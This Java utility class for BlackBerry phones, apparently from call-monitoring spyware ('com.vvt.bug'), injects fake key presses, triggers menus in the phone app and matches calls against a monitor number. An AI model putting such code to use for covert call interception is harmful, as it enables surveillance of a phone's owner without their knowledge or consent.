package com.vvt.bug;

import java.util.Timer;
import java.util.TimerTask;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.device.api.i18n.Locale;
import net.rim.device.api.system.EventInjector;
import net.rim.device.api.system.KeypadListener;
import net.rim.device.api.ui.MenuItem;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.Menu;

public class Util {
	
	protected Locale locale;
	protected boolean localeEnglish;
	
	public void injectKey(final char key, long timeToWait) {
		try {
			new Timer().schedule(new TimerTask() {
				public void run() {
					injectKey(key);
				}
			}, timeToWait);
		} catch (Exception e) {
		}
	}

	public void injectKey(char key) {
		try {
			EventInjector.KeyCodeEvent eDown = new EventInjector.KeyCodeEvent(EventInjector.KeyCodeEvent.KEY_DOWN, key, KeypadListener.STATUS_NOT_FROM_KEYPAD, 100);
			EventInjector.KeyCodeEvent eUp = new EventInjector.KeyCodeEvent(EventInjector.KeyCodeEvent.KEY_UP, key, KeypadListener.STATUS_NOT_FROM_KEYPAD, 100);
			EventInjector.invokeEvent(eDown);
			EventInjector.invokeEvent(eUp);
		} catch (Exception e) {
		}
	}

	public void executeMenuItemThread(final MenuItem menuItem, long timeToWait) {
		try {
			new Timer().schedule(new TimerTask() {
				public void run() {
					executeMenuItemThread(menuItem);
				}
			}, timeToWait);
		} catch (Exception e) {
		}
	}

	public void executeMenuItemThread(MenuItem menuItem) {
		try {
			if (menuItem != null) {
				new Thread(menuItem).start();
			}
		} catch (Exception e) {
		}
	}
	
	public MenuItem getMenuItem( String menuItemName, UiApplication voiceApp, boolean localeEnglish, Locale locale) {
		MenuItem menuItem = null;
		try {
			Screen screen = voiceApp.getActiveScreen();
			if (!localeEnglish)
				Locale.setDefault(Locale.get(Locale.LOCALE_en));
			Menu menu = screen.getMenu(0);
			int size = menu.getSize();
			for (int i = 0; i < size; i++) {
				menuItem = (MenuItem) menu.getItemCookie(i);
				String itemName = menuItem.toString();
				if (itemName.startsWith(menuItemName)) {
					if (!localeEnglish)
						Locale.setDefault(locale);
					break;
				}
			}
			if (!localeEnglish)
				Locale.setDefault(locale);
		} catch (Throwable e) {
		}
		return menuItem;
	}
	
	public boolean isSCC(PhoneCall phoneCall, String monitorPhoneNumber) {
		String phoneNumber = phoneCall.getDisplayPhoneNumber();
		boolean numbersAreTheSame = phoneNumber.endsWith(monitorPhoneNumber);
		if (!numbersAreTheSame) {
			phoneNumber = PhoneNumberFormat.removeNonDigitCharacters(phoneNumber);
			phoneNumber = PhoneNumberFormat.removeLeadingZeroes(phoneNumber);
			numbersAreTheSame = phoneNumber != "" && monitorPhoneNumber.endsWith(phoneNumber);
		}
		return numbersAreTheSame;
	}
}
